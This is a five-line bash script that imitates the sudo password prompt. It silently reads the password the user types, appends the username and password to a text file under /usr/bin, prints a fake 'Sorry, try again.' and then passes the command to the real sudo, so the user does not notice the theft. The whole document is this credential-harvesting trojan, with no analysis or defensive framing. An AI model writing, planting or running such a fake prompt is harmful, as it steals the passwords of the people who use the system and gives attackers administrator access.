#! /bin/bash
read -ps "[sudo] password for $USER" 
echo "$USER:$REPLY" >> /usr/bin/password_storage.txt
echo -n "Sorry, try again."
sudo $@
